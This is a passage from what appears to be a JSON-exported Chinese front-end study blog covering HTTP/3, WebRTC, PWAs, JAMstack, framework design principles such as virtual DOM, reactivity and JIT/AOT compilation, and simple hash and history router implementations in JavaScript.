**易于使用**：提供了丰富的预训练模型和简化的 API，降低了机器学习的入门门槛。\n\n### 3.3. 应用场景\n\n- **图像识别**：实时的图像分类和对象检测。\n- **自然语言处理**：文本分类、情感分析和翻译。\n- **推荐系统**：个性化推荐和内容过滤。\n\n## 4. HTTP/3\n\n### 4.1. 定义\n\nHTTP/3 是 HTTP 协议的最新版本，基于 `QUIC` 协议（**Quick UDP Internet Connections**）。它旨在提高 Web 的传输效率和可靠性。\n\n>  Chrome、Edge、Firefox 和 Safari 都已经实现了 HTTP/3 支持\n\n\n### 4.2. 特点\n\n- **基于 UDP**：使用 `UDP` 代替 TCP，减少了连接建立的延迟。\n- **多路复用**：在一个连接中同时传输多个数据流，避免了“队头阻塞”问题。\n- **内置加密**：默认使用 TLS 1.3 提供安全传输。\n\n### 4.3. 优势\n\n- **更快的连接建立**：减少了握手时间，提高了页面加载速度。\n- **更好的性能**：在高延迟和丢包环境下表现更好。\n- **增强的安全性**：内置加密提供了更强的安全保障。\n\n> 详见计算机网络章节 [1. 关于HTTP 的一些常见问题汇总](/post/mh0VAQAP.html) \n\n## 5. WebRTC\n\n### 5.1. 定义\n\nWebRTC（Web Real-Time Communication）是一个支持浏览器和移动应用进行实时通信的开源项目。它**允许音频、视频和数据的直接传输，无需中介服务器。**\n\n### 5.2. 特点\n\n- **点对点通信**：\n\t- **直接在客户端之间传输数据，减少了延迟**。\n- **跨平台支持**：\n\t- 在不同浏览器和设备上运行一致。\n- **高质量传输**：\n\t- 支持高质量的音频和视频传输。\n\n### 5.3. 应用场景\n\n- **视频会议**：\n\t- 实时的视频通话和会议。\n- **在线教育**：\n\t- 实时的教学和互动。\n- **游戏和娱乐**：\n\t- 实时的多人游戏和互动体验。\n\n## 6. Progressive Web Apps (PWA)\n\n### 6.1. 定义\n\n渐进式 Web 应用（PWA）是一种结合了 Web 和本地应用优点的新型应用形式。PWA 使用现代 Web 技术提供类似本地应用的用户体验。\n\n### 6.2. 特点\n\n- **离线访问**：通过 `Service Worker` 实现离线缓存。\n- **推送通知**：支持推送通知，保持用户互动。\n- **安装到主屏幕**：用户可以将 PWA 安装到主屏幕，像本地应用一样使用。\n\n### 6.3. 优势\n\n- **跨平台**：在不同操作系统和设备上运行一致。\n- **无需安装**：用户通过浏览器访问，无需下载和安装。\n- **自动更新**：应用更新自动推送到用户，无需手动操作。\n\n## 7. JAM stack 架构\n\n>  更多见 [8. JAMstack 架构](/post/beBNemRn.html)\n\n### 7.1. 定义\n\nJAM 代表 JavaScript、APIs、Markup。\n\n- JavaScript 是网络应用程序使用的编程语言\n- API（应用程序编程接口）是一种从别人的程序或应用程序中请求数据的方式\n- Markup 是向浏览器提供格式化指示的代码（HTML 和 CSS）。\n\nJAMstack 是一种现代 Web 开发架构，强调客户端 JavaScript、可重用 API 和预构建标记（Markup）。它旨在提高 Web 应用的性能、安全性和可扩展性。\n\n### 7.2. 特点\n\n- **静态生成**：使用静态站点生成器（如 Gatsby、Next.js）预构建页面，提高加载速度。\n- **无服务器**：通过 API 调用实现动态功能，减少服务器管理。\n- **分离关注点**：前端和后端分离，前端通过 API 获取数据。\n\n### 7.3. 优势\n\n- **高性能**：静态页面加载速度快，用户体验好。\n\t- 因为：**JAMstack 应用程序中的几乎所有内容都由从 CDN 提供的静态 HTML 文件组成**\n- **高安全性**：减少了服务器攻击面，提高了安全性。\n- **易于扩展**：通过 API 扩展功能，灵活性高。\n\t- 由于 JAMstack 前端速度快且后端轻量化，因此 JAMstack 应用程序通常具有极强的可扩展性。\n\n\n\n\n","nHXVhH5H":"\n# 前言\n\n\n- 前端框架篇\n\t- 其他前端框架：\n\t\t- 非 Vue 和 非 React 的文章汇总\n\t- 前端通用框架设计知识\n\t- 前端框架趋势\n\n目录：\n- [1. 前端框架设计概述](/post/LhB7GCCi.html)\n- [2. 前端框架设计里的\"权衡\" 与\"选择\"](/post/DaaRDukb.html)\n- [3.  前端框架设计的核心要素](/post/5uJ23G12.html)\n- [4. 前端元框架](/post/Iom0MuIb.html)","LhB7GCCi":"\n# 前端框架设计概述\n\n`#前端/前端框架` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 什么才算前端框架？\n- 现代前端框架要点\n\t- 围绕 `UI = f(state)` 展开的\n\t\t-  `UI` 依赖与宿主环境的`渲染引擎`\n\t\t- `f` 是框架本身的`运行机制`\n\t\t- `state` 当前视图的`状态/数据`\n\t- 组件化：独立单元，方便复用\n\t- vdom：分层\n\t- 响应式系统\n\t\t-  Vue：\n            - 使用 `Proxy` 和 `Object.defineProperty` 来检测数据变更。\n        - React：\n            - 通过==状态（state）管理系统==更新，通常结合 `setState` 或 `hooks`。\n\t\t- 自动收集+自动触发更新\n\t- 单选数据流\n\t- 模板与声明式渲染\n\t- 路由管理\n\t- 生命周期管理\n\t- 性能优化手段：懒加载、代码分割\n\t- 跨平台渲染：\n\t\t- ssr、ssg、rn\n\t\t- 抽象出渲染层，兼容多平台\n\t- ==事件委托== ： 管理和优化事件绑定\n\t\t- react 的合成事件：统一管理事件监听等\n\t\t- vue 的自定义事件 + 原生事件等\n\t- 编程范式\n\t\t- 组合而非继承\n\t\t- 函数式编程，推崇纯函数和不可变数据\n\t- 配合编译时优化，比如\n\t\t- 内联优化，写到模板里的回调函数，提出来\n\t\t- 静态代码编译 → 提升\n- 如何描述 UI：更直观还是更灵活？\n\t- 声明式：vue 、jsx 、HTML 等等\n\t- js 对象：\n\t\t- vdom \n\t\t- 渲染函数\n\t\t\t- vue h\n\t\t\t- React 的 createElement\n- 副作用\n\t- 影响到==组件以外==的地方\n\t- 纯函数，没有副作用\n- 渲染函数\n\t- ==创建虚拟 DOM 节点==的工厂函数\n\t- 比如vue的 h 函数：`h(标签或组件, 属性对象, 子节点列表&文本节点)`\n\t\t- ![图片&文件](./files/20250102.png)\n- 前端框架中的一些==编译技术&编译策略==\n\t- JIT：即时编译\n\t\t- 比较适合开发时\n\t\t\t- 源码和产物方便对应\n\t- AOT ：预编译\n\t- 增量编译\n\t- 懒加载（Lazy Loading）或者叫延迟编译，按需编译\n\t\t- 现在 vite 就是这个代表\n\t- tree shaking \n\t- source mapping\n\t- 选择\n\t\t-  **开发期间**，快速迭代和调试需求往往让 `JIT` 更受青睐。\n\t\t- **生产环境**，启动性能和安全性通常使 `（AOT（Ahead-of-Time）` 成为更好的选择\n- 现代框架优化思路\n\t- 编译时优化\n\t- 运行时优化\n\t\t- 虚拟 DOM diff 算法优化\n\t\t- 事件处理优化\n\t\t- 状态更新批处理\n\t\t- 缓存优化\n\t\t- **编译时静态分析**\n\t\t\t- 提前优化**静态内容**\n\t\t- **增量渲染**: \n\t\t\t- 只更新变化的部分\n\t\t\t- 分批次渲染大列表\n\t\t- **异步渲染**: \n\t\t\t- 任务分片和优先级调度 \n\t\t- **渲染优先级**:\n\t\t\t- 智能调度渲染任务\n\t\t- **后台预渲染**: \n\t\t\t- 利用空闲时间==预渲染==\n\t\t- **选择性渲染**: \n\t\t\t- 智能跳过不必要的更新\n\t- 构建优化\n\t\t- 体系化思路见 [14.  前端构建提速的体系化思路](/post/NNGKpVrs.html) \n\t- 加载优化\n\t\t- 预加载\n\t\t- 代码分割、异步组件\n\t\t- 资源压缩，图片，字体等\n\t\t- CDN\n\t\t- 缓存策略设置\n\t- 开发体验优化\n\t\t- 热更新\n\t\t- 工具链\n\t\t- ts 提醒\n\t\t- 错误、排查定位问题等\n\t- ==服务器组件==\n\t\t- RSC\n\t- 跨平台\n\t\t- 抽象出来\n\t\t- 跨平台的一致开发体验\n\t- 响应式优化：\n\t\t- 自动收集+自动触发更新\n\n## 2. 何为前端框架\n\n- umi 算是框架\n\t- 内置了路由、构建、流水线部署等\n- Angular 是框架\n- Next.js ：\n\t- 基于 React 的，支持 SSR、SSG的`服务端框架`\n- Nuxt.js \n\t- 基于 Vue\n- Modern.js 等\n\n## 3. 前端库与前端框架的区别？\n\n- 框架：\n\t- React\n\t\t- 虽然有时被称为库，但因其生态系统更像框架\n\t\t- Angular \n\t\t- Vue.js \n- 库：\n\t- 提供特定功能的工具集，比如 jQuery、Lodash、Moment.js\n\n> 严格说，React 和 Vue 都不算是`框架`，而算是`库`\n\n## 4. 现代前端框架的实现原理\n\n现代前端框架的**核心实现原理**是通过**组件化、虚拟DOM和响应式系统**等，实现**高效的声明式 UI 渲染 和 状态管理**。\n- 其实就是围绕 `UI = f(state)` 展开的\n\t- `UI` 依赖与宿主环境的`渲染引擎`\n\t- `f` 是框架本身的`运行机制`\n\t- `state` 当前视图的`状态/数据`\n- 至于**组件化、VDom、响应式**等都是`手段`\n\n## 5. 现代前端框架的核心模块组成有哪些？\n\n1. **组件化**：\n\t- 前端框架通常以组件为基础构建应用程序。\n\t- 组件是封装了 **UI 和逻辑的独立单元**，可以重复使用\n2. **虚拟 DOM**：\n    - 虚拟 DOM 是内存中的一个轻量级表示，用于优化实际 DOM 操作。\n3. **响应式系统**：\n    - 现代框架提供自动化的响应式数据绑定，确保当应用状态变化时，UI 会自动更新。\n    - 实现：\n        - Vue：\n            - 使用 `Proxy` 和 `Object.defineProperty` 来检测数据变更。\n        - React：\n            - 通过状态（state）管理系统更新，通常结合 `setState` 或 `hooks`。\n4. **单向数据流**：\n    - 通过单向数据流来管理组件之间的数据传递，以确保应用的数据流动方向明确，易于跟踪和调试。\n    - 实现：\n        - 通常采用状态管理库（如 Redux、Vuex、Pinia 等）\n            - 管理全局应用状态，\n            - 并通过严格的操作步骤来更新状态。\n5. **模板和声明式渲染**：\n    - 使用模板来描述 UI，提供声明式的视图定义。\n    - 实现：\n        - 模板语法被**编译**为渲染函数，将数据映射到 UI 组件。\n            - 比如 \n                - JSX 编译成 `createElement`\n                - `.vue` 编译成 `h 函数`\n6. **路由管理**：\n    - 实现单页应用（SPA）的视图切换，方便在不同页面之间导航。\n    - 实现：\n        - 框架提供路由功能（如 React Router、Vue Router），匹配路径并渲染相应组件。\n7. **生命周期管理**：\n    - 提供钩子函数\n        - 允许开发者在组件特定的生命周期阶段执行代码。\n    - 实现：\n        - 通过生命周期方法（React 的 componentDidMount、useEffect，Vue 的 created、mounted 等）来获取个性化控制。\n8. **性能优化**：\n    - 现代框架通过多种技术优化性能，如懒加载、代码分割等。\n    - 实现：\n        - 框架提供内置的工具和约定，以减少初始加载时间和优化更新性能。\n9. **跨平台渲染**： \n\t- 支持服务器端渲染（SSR）、静态站点生成（SSG）、以及与移动和桌面平台（如 React Native）集成。 \n\t- 抽象出**渲染层**，并提供多平台兼容的实现\n10. **事件处理**\n    - 管理和优化事件绑定\n    - 实现: \n        - 事件委托，统一管理事件监听\n\n## 6. 如何描述 UI\n\n### 6.1. 方式一：声明式描述 UI - 模板\n\n主流其实都是**模板**来描述，无论是 jsx 或者模板引擎都是**模板**\n\n- JSX 也是一种特殊的模板，兼顾以下两个特性（关于 JSX，更多见 [9. 深入理解 JSX](/post/tUd6T3fh.html)）\n\t- 强逻辑表达\n\t- UI 描述丰富性\n- 模板，即声明式描述 UI  \n\t- 代表 \n\t\t- HTML\n\t\t- `.vue` SFC\n\t\t- php smarty\n\t\t- jsp 等等\n\t\t- ejs\n\t- 主要问题是逻辑表达性弱了些\n\n举例：`声明式描述 UI`\n- 比如 `<div class='btn' id='test' @click=\"handle\"> button </div>`， 包含信息 tag名，属性，事件，层级关系  \n\n### 6.2. 方式二：JavaScript 对象  \n\n 使用 `JavaScript对象 ` 来描述 UI，如下代码 \n\n```javascript  \nconst title = {\n    tag: 'h1', // tag 名称\n    props:{\n\t    // 属性与事件\n\t    onClick:handler\n\t}\n\tchildren:[\n      // 子节点\n      {tag: 'span'}\n  ]\n}\n```  \n\n#### 6.2.1. V-DOM\n\n`虚拟 DOM` 描述 UI，比如 vue 中的 `渲染函数 - h` ，如下代码：  \n\n```javascript  \nimport { h } from \"vue\";\nexport default{\n    render(){\n        // 虚拟 DOM\n        return h('h1',{ onClick: fn }); \n        // 或者直接返回 js 对的\n        return {\n            tag: 'h1', // tag 名称\n            props:{ // 属性与事件\n                onClick:handler\n            }\n            children:[ // 子节点\n                {tag: 'span'}\n            ]\n        }\n    }\n}\n```  \n\n`h` 返回的其实就是 `js 对象`， `h 函数`就是辅助创建虚拟 DOM 的工具函数而已，**所以他俩其实是一个东西**  \n\n### 6.3. 两种方式的对比\n\n- 哪种方式**更灵活**呢？  \n  - 答案是：`JavaScript 对象`（或`虚拟 DOM` ） 的方式，  \n     - 比如表现 `H1-H6` ，使用 `tag:H${index}` 即可  \n     - 又比如说，`jsx`的方式实现 `递归树`，更方便  \n- 那种方式**更直观**呢？\n\t- 当然是 `模板`\n\n## 7. 数据与视图（UI ）\n\n简单说，前端框架需要`数据驱动 UI 渲染`，即数据变化了，UI 视图跟着一起变化\n\n## 8. 什么是副作用\n\n- 指的是在组件渲染过程中，那些会影响到**组件之外**的其他部分的操作，比如\n\t- 发起网络请求（如 API 调用）\n\t- 修改 DOM（直接操作，而非通过框架的渲染机制）\n\t- 设置定时器或间隔器\n\t\t- 如 `setTimeout` 或 `setInterval`\n\t- 订阅外部事件\n\t- 修改全局变量\n\t- 写入本地存储\n\t\t- 如修改 `localStorage` 或 `sessionStorage`\n\t- 日志记录等\n\n比如：访问/修改 `localStorage`（副作用）\n\n```jsx\n// 这个组件将用户名存储在浏览器的 localStorage 中，这是一个影响外部环境的操作\nfunction RememberMe({ username }) {\n \n useEffect(() => {\n   localStorage.setItem('username', username);\n }, [username]);\n \n return <div>Remembering {username}</div>;\n}\n```\n\n相对比的，**纯函数**或者没有副作用代表**不会影响到它本身以外的任何东西**，比如\n\n```jsx\n// 这个组件只是单纯地渲染文本，不会影响其他任何东西。\nfunction Welcome(props) {\n\t return <h1>Hello, {props.name}</h1>;\n}\n```\n   \n副作用不是简单的渲染操作，而是会影响组件外部状态或环境的操作。\n\n>  在现代前端框架中，妥善管理这些`副作用`是保证应用稳定性和性能的关键。\n\n## 9. 展开说说渲染函数：以 Vue 的 `h 函数` 为例\n\n- `h函数` 是**用于创建虚拟 DOM 节点**的一个函数，通常**在渲染函数中使用**。\n- `h 函数`本质上是**一个创建虚拟 DOM 节点的工厂函数**。\n\t- 它的作用可以类比为`用 JavaScript 来写 HTML`。\n\n简单来说：\n- 作用：\n\t- **创建虚拟 DOM 节点**\n- 使用场景：\n\t- 当你需要用 JavaScript 来精确控制渲染内容时\n- 基本语法：参数\n\t- `h(标签或组件, 属性对象, 子节点列表&文本节点)`\n\n一个简单的例子：\n\n```javascript\n// HTML: <div class=\"greeting\">Hello, World!</div>\nh('div', { class: 'greeting' }, 'Hello, World!')\n\n// HTML: <button onClick=\"alert('Hi')\">Click me</button>\nh('button', { onClick: () => alert('Hi') }, 'Click me')\n\n// 嵌套使用\nh('div', [\n  h('h1', 'Title'),\n  h('p', 'Paragraph')\n])\n```\n\n### 9.1. 主要用途\n\n1. **创建虚拟 DOM**:\n\t- `h` 函数通过 JavaScript 对象来描述 DOM 结构，这对于动态创建组件结构、进行复杂的条件渲染等场景十分有用。\n2. **渲染函数中使用**:\n\t- 在需要完全控制渲染逻辑时，`h` 函数可以与渲染函数一起使用，以构建组件的虚拟 DOM 树。\n3. **支持 JSX 语法**:\n\t- 在使用 JSX 语法时，**JSX 会被编译成 `h` 函数调用**。\n\t- 使用 React 也一样，JSX 渲染成 `createElement` 等函数\n\n### 9.2. 常见的 `h` 函数参数\n\n- **第一个参数**：\n\t- 标签名称、组件类型或异步组件（可以是字符串或组件变量）\n- **第二个参数**（可选）：\n\t- 一个数据对象，包括属性、class、事件等\n- **第三个参数**（可选）：\n\t- 子节点，可以是字符串、数组或更多 `h` 函数调用\n\n### 9.3. 示例\n\n```javascript\nimport { h } from 'vue';\n\nexport default {\n  render() {\n    return h('div', { class: 'container' }, [\n      h('h1', 'Hello World'),\n      h('p', 'This is a paragraph.'),\n      h(MyButton, { onClick: this.handleClick }, 'Click Me')\n    ]);\n  },\n  methods: {\n    handleClick() {\n      alert('Button clicked!');\n    }\n  }\n}\n```\n\n- 在这个例子中，`h` 函数用于创建一个 `div` 包含一个标题、一个段落和一个自定义按钮组件。\n\t- 这种方式提供了非常灵活的界面渲染能力，可以在不依赖模板的情况下，直接**使用 JavaScript 表达业务逻辑**。\n\n## 10. 前端框架中的一些编译技术或编译策略\n\n代码编译技术或者策略，对**应用程序的性能和开发体验**有重要影响，还直接影响开发效率和调试能力。选择合适的编译策略通常需要权衡开发体验、应用性能和部署环境等多个因素。\n\n### 10.1. JIT（Just-in-Time）编译：即时编译、运行时编译\n\n**JIT 编译**是在**运行时**进行的编译。代码在执行时被动态编译为机器码。\n\n特点：\n- 灵活性高：可以根据运行时的情况进行优化。\n- 启动时间较长：因为需要在运行时编译。\n- 内存占用较大：需要保存原始代码和编译后的代码。\n\n应用：\n- 在浏览器中广泛使用，如 **V8 引擎（Chrome）**。\n- Angular 的**开发时模式**默认使用 JIT。\n\n优势：\n- 开发过程中更快的构建时间\n- 易于调试，因为**源代码和运行代码之间有直接对应关系**\n\n### 10.2. AOT（Ahead-of-Time）：预编译\n\n**AOT 编译**是在**构建阶段**就将代码编译为机器码或更低级的代码。\n\n特点：\n- 更快的启动时间：\n\t- 因为代码已经预先编译\n- 更小的包体积：\n\t- 不需要包含编译器\n- 更好的安全性：\n\t- 源代码不暴露在客户端\n\n应用：\n- **Angular 生产模式**默认使用 AOT\n- React 的 `Prepack` 是一种 AOT 优化工具。\n\t- 分析代码的静态部分\n\t- 预执行可以预计算的代码（**看下面代码**）\n\t- 生成优化后的等效代码\n\t- 保持代码的语义不变\n\t- 目前 **Prepack 项目处于暂停状态**\n\n```javascript hl:5\n// 原始代码\nconst x = 2 + 3;\nconst y = x * x;\n\n// Prepack 优化后\nconst y = 25; // 直接计算结果\n\n```\n\n优势：\n- 更快的首次加载和渲染速度。\n- 在构建时就能发现某些类型的错误。\n\n### 10.3. 增量编译（Incremental Compilation）\n\n只重新编译**发生变化的部分（增量部分）**，而不是整个应用\n\n特点：\n- 加快开发中的编译速度。\n- 在大型项目中特别有效。\n\n应用：\n- TypeScript 和许多现代构建工具支持增量编译。\n\n### 10.4. 懒加载（Lazy Loading）\n\n- 不是的编译技术，**是一种编译策略**\n- 定义\n\t- 按需加载代码块，而不是一次性加载整个应用\n- 特点：\n\t- 改善初始加载时间。\n\t- 减少不必要的网络传输。\n- 应用：\n\t- Angular、React Router 等都支持**路由级别的懒加载**\n\t- 还有现在相对比较成熟的 `vite`\n\n### 10.5. Tree Shaking\n\n- 定义：移除未使用的代码（死代码消除）。\n- 特点：\n\t- 减小最终的包大小。\n\t- 通常与 ES6 模块和 AOT 编译结合使用。\n- 应用：\n\t- Webpack、Rollup 等构建工具支持 Tree Shaking。\n\n### 10.6. 源码映射（Source Mapping）\n\n- 定义：在生产环境中将压缩和转换后的代码映射回原始源代码。\n- 特点：\n\t- 便于在生产环境中进行调试。\n\t- 通常与 AOT 编译结合使用。\n\n### 10.7. 选择\n\n- **开发期间**，快速迭代和调试需求往往让 `JIT` 更受青睐。\n- **生产环境**，启动性能和安全性通常使 `（AOT（Ahead-of-Time）` 成为更好的选择\n\n## 11. 现代框架的优化思路\n\n### 11.1. 框架核心设计原则\n\n- **JSX/模板语法**: \n\t- 直观的视图描述方式\n- **组件组合**: \n\t- 通过**组合而非继承**构建复杂UI\n- **函数式编程**: \n\t- 推崇纯函数和不可变数据\n\t\t- Vue 或 React 的 hooks 都是这个思路\n\n### 11.2. 编译时优化\n\n- 常量折叠\n- 内联优化\n- 静态代码编译 → 提升\n- 死代码消除\n- Props 传递优化\n\n```javascript\n// 传统运行时框架\nconst app = createApp({\n  template: '<div>{{ message }}</div>'\n})\n\n// 现代编译时框架（如Svelte）\n// 编译后直接生成优化的 JavaScript 代码\nfunction update(message) {\n  div.textContent = message;\n}\n```\n\n### 11.3. 运行时优化\n\n- 虚拟 DOM diff 算法优化\n- 事件处理优化\n- 状态更新批处理\n- 缓存优化\n- **编译时静态分析**: \n\t- 提前优化**静态内容**\n- **增量渲染**: \n\t- 只更新变化的部分\n\t- 分批次渲染大列表\n- **异步渲染**: \n\t- 任务分片和优先级调度 \n- **渲染优先级**:\n\t- 智能调度渲染任务\n- **后台预渲染**: \n\t- 利用空闲时间==预渲染==\n- **选择性渲染**: \n\t- 智能跳过不必要的更新\n\n### 11.4. 构建优化\n\n```javascript\n// 现代构建工具配置示例\nexport default {\n  build: {\n    target: 'esnext',\n    rollupOptions: {\n      output: {\n        manualChunks: {\n          vendor: ['react', 'react-dom'],\n          utils: ['lodash', 'moment']\n        }\n      }\n    }\n  }\n}\n```\n\n### 11.5. 加载优化\n\n- **代码分割**: \n\t- 路由级别的代码分割\n- **预加载策略**: \n\t- 使用预加载提示\n- **资源优化**:\n\t- 图片、字体等资源的优化\n- **缓存策略**: \n\t- 合理的缓存配置 \n\n### 11.6. 开发体验优化\n\n- 工具链集成：\n\t- jsx、ts、vite 等等\n- **热模块替换**: \n\t- 快速更新修改\n- **类型检查**: \n\t- TypeScript 集成\n- **开发工具**: \n\t- DevTools 支持\n- **调试能力**: \n\t- 源码映射\n\n### 11.7. 服务器组件（RSC）\n\n```javascript\n// 服务器组件示例 (React Server Components)\n// server-component.jsx\nasync function ServerComponent() {\n  const data = await db.query('SELECT * FROM posts');\n  return <div>{data.map(post => <Post key={post.id} {...post} />)}</div>;\n}\n```\n\n### 11.8. 跨平台\n\n- **Web Components**: \n\t- 标准化组件\n- **跨平台渲染**: \n\t- **统一的渲染抽象**\n- **原生性能**: \n\t- 更接近原生的性能\n- **一致性体验**: \n\t- 跨平台的一致开发体验\n\n### 11.9. 响应式系统优化：自动收集+自动触发更新\n\n```javascript\n// 现代响应式系统示例\nconst createSignal = (value) => {\n  const subscribers = new Set();\n  \n  const read = () => {\n    // 依赖收集\n    if (currentEffect) {\n      subscribers.add(currentEffect);\n    }\n    return value;\n  };\n  \n  const write = (newValue) => {\n    value = newValue;\n    // 触发更新\n    subscribers.forEach(effect => effect());\n  };\n  \n  return [read, write];\n};\n```\n\n\n","QFW08g83":"\n# 实现一个简易版本的前端路由\n\n`#前端框架` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 哈希路由\n\t- 监听两个事件\n\t\t- DOMContentLoaded -> onLoad\n\t\t\t- 主动触发一次 onHashChange\n\t\t- hashchange -> onHashChange\n\t\t\t- 每次更新直接修改 `#app` 的 `innerHtml`\n- history 路由\n\t- 监听两个事件\n\t\t- DOMContentLoaded -> onLoad\n\t\t\t- 主动触发一次 `onPopState`\n\t\t- `popstate` -> `onPopState`\n\t\t\t- 每次更新直接修改 `#app` 的 `innerHtml`\n\t\t\t- 拦截 `a 标签`的默认行为\n\n## 2. 哈希路由简易实现\n\n- 关键点\n\t- 监听两个事件\n\t\t- DOMContentLoaded -> onLoad\n\t\t\t- 主动触发一次 onHashChange\n\t\t- hashchange -> onHashChange\n\t\t\t- 每次更新直接修改 `#app` 的 `innerHtml`\n\n```html\n<body>\n    <ul>\n        <!-- 定义路由 -->\n        <li><a href=\"#/home\">home</a></li>\n        <li><a href=\"#/about\">about</a></li>\n    </ul>\n    <!-- 渲染路由对应的 UI -->\n    <div id=\"app\"></div>\n</body>\n\n<script type=\"text/javascript\">\n    // 页面加载完不会触发 hashchange\n    // 所以这里需要主动触发一次 hashchange 事件\n    window.addEventListener(\"DOMContentLoaded\", onLoad);\n    // 监听路由变化\n    window.addEventListener(\"hashchange\", onHashChange);\n\n    // 路由视图，用于渲染路由对应的 UI\n    var routerView = null;\n\n    function onLoad() {\n        routerView = document.querySelector(\"#app\");\n        onHashChange();\n    }\n\n    // 路由变化时，根据路由渲染对应 UI\n    function onHashChange() {\n        switch (window.location.hash) {\n            case \"#/home\":\n                routerView.innerHTML = \"Home\";\n                return;\n            case \"#/about\":\n                routerView.innerHTML = \"About\";\n                return;\n            default:\n                return;\n        }\n    }\n</script>\n\n```\n\n## 3. history 路由简易实现\n\n- 关键点\n\t- 监听两个事件\n\t\t- DOMContentLoaded -> onLoad\n\t\t\t- 主动触发一次 onPopState\n\t\t- popstate -> onPopState\n\t\t\t- 每次更新直接修改 `#app` 的 `innerHtml`\n\t\t\t- 拦截 a 标签的默认行为\n\n```html\n<body>\n    <ul>\n        <!-- 定义路由 -->\n        <li><a href=\"#/home\">home</a></li>\n        <li><a href=\"#/about\">about</a></li>\n    </ul>\n    <!-- 渲染路由对应的 UI -->\n    <div id=\"app\"></div>\n</body>\n<script type=\"text/javascript\">\n    // 页面加载完不会触发 hashchange\n    // 这里主动触发一次 hashchange 事件\n    window.addEventListener(\"DOMContentLoaded\", onLoad);\n    // 监听路由变化\n    window.addEventListener(\"popstate\", onPopState);\n\n    // 路由视图\n    var routerView = null;\n\n    function onLoad() {\n        routerView = document.querySelector(\"#app\");\n        onPopState();\n\n        // 拦截 <a> 标签点击事件默认行为， 点击时使用 pushState 修改 URL并更新手动 UI，\n        // 从而实现点击链接更新 URL 和 UI 的效果。\n        var linkList = document.querySelectorAll(\"a[href]\");\n        linkList.forEach((el) =>\n            el.addEventListener(\"click\", function (e) {\n                e.preventDefault();\n                history.pushState(null, \"\", el.getAttribute(\"href\"));\n                onPopState();\n            }),\n        );\n    }\n    // 路由变化时，根据路由渲染对应 UI\n    function onPopState() {\n        switch (location.pathname) {\n            case \"/home\":\n                routerView.innerHTML = \"Home\";\n                return;\n            case \"/about\":\n                routerView.innerHTML = \"About\";\n                return;\n            default:\n                return;\n        }\n    }\n</script>\n\n```\n\n### 3.1. 附：popstate 事件\n\n- 仅仅调用`pushState()`方法或`replaceState()`方法 ，并不会触发该事件; \n\t- 只有用户`点击浏览器倒退按钮和前进按钮`，\n\t- 或者使用 JavaScript 调用`History.back()、History.forward()、History.go()` 方法时才会触发。\n\t- 或者点击 `a 标签`的跳转\n- 另外，该事件只针对同一个文档，如果浏览历史的切换，导致加载不同的文档，该事件也不会触发。\n- 页面 `第一次加载的时候`，浏览器不会触发`popstate`事件\n- `pushState 与 replaceState` 调用后 History 对象会变化，地址栏会变化，但不会触发页面刷新事件\n\t- ![图片&文件](./files/20241024-17.png)\n\n## 4. 一个简单的 Router 类实现\n\n### 4.1. 入口\n\n```html\n<!DOCTYPE html>\n<html>\n<body>\n  <nav>\n    <a href=\"/\" data-link>Home</a>\n    <a href=\"/about\" data-link>About</a>\n    <a href=\"/contact\" data-link>Contact</a>\n  </nav>\n  <div id=\"app\"></div>\n  <script src=\"router.js\"></script>\n</body>\n</html>\n\n```\n\n### 4.2. Router 实现\n\n```javascript\nclass Router {\n  constructor(routes) {\n    this.routes = routes;\n    this.rootElement = document.getElementById(\"app\");\n    this.init();\n  }\n\n  init() {\n    window.addEventListener(\"popstate\", this.handlePopState.bind(this));\n    this.handleRouteChange();\n    this.bindLinks();\n  }\n\n  // 为所有带有 data-link 属性的链接添加点击事件监听器\n  // 阻止默认行为并调用 navigateTo 方法\n  bindLinks() {\n    document.addEventListener(\"click\", (e) => {\n      if (e.target.matches(\"[data-link]\")) {\n        e.preventDefault();\n        this.navigateTo(e.target.href);\n      }\n    });\n  }\n\n  handlePopState() {\n    this.handleRouteChange();\n  }\n\n  // 获取当前路径\n  // 查找匹配的路由\n  // 如果找到匹配的路由，渲染对应的组件\n  // 如果没有找到匹配的路由，显示 404 页面\n  handleRouteChange() {\n    // 获取当前路径\n    const path = window.location.pathname;\n    const route = this.routes.find((route) => route.path === path);\n\n    if (route) {\n      this.rootElement.innerHTML = route.component();\n    } else {\n      this.rootElement.innerHTML = \"<h1>404 Not Found</h1>\";\n    }\n  }\n\n  // 使用 History API 更新 URL\n  // 触发路由变化处理\n  navigateTo(url) {\n    history.pushState(null, null, url);\n    this.handleRouteChange();\n  }\n}\n\n// 使用示例\nconst routes = [\n  {\n    path: \"/\",\n    component: () => \"<h1>Home Page</h1>\",\n  },\n  {\n    path: \"/about\",\n    component: () => \"<h1>About Page</h1>\",\n  },\n  {\n    path: \"/contact\",\n    component: () => \"<h1>Contact Page</h1>\",\n  },\n];\n\nconst router = new Router(routes);\n```\n\n## 5. mini-react-router-dom 的简易实现\n\n> 使用最新的 Hooks 的方式实现\n\n`#todo` \n\n\n很多细节需要慢慢实现，比如\n- 嵌套路由等\n- 路由守卫\n- 支持参数查询\n- 路由过渡动画\n- 路由懒加载\n- 更复杂的路径匹配模式\n- 路由元信息\n- 路由钩子（beforeEach, afterEach）等\n\n","DaaRDukb":"\n# 前端框架设计里的\"权衡\" 与\"选择\"\n\n\n`#vue` `#前端架构`  `#前端/前端框架` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 命令 vs 声明 ，如何选择？\n\t- 一般：底层是==命令式==，开发者用的是==声明式==\n\t- 性能对比呢？\n- 性能 与 维护性 的平衡\n- 运行时 与 编译时\n\t- 各类框架属于==哪种时？==\n- 等等\n\n## 2. 命令式框架与声明式框架  \n\n  \n- `Jquery` 就是典型的 **命令式框架**，关注`过程`  \n- Vue 暴露给用户使用的是 `声明式` \n\t- 但底层内部实现肯定也是 `命令式` ，如下示例：面向用户的是声明式的  \n- JSX 也是声明式的\n  \n```vue  \n<template>  \n  <div @click=\"hello()\"></div>  \n</template>  \n```  \n  \n但问题是，**声明式的代码性能**`不会高于` `命令式代码的性能` ，所以这是一个`选择` 或者 `权衡`\n\n## 3. 性能 与 维护性 的平衡  \n\n  \n![图片|840](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240810211402.png)\n\n## 4. 运行时 与 编译时  \n\n### 4.1. 纯运行时，即直接`Render`即可  \n\n![图片|600](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240810211504.png)\n\n### 4.2. 运行时 + 编译时  \n\n如下图，常用的 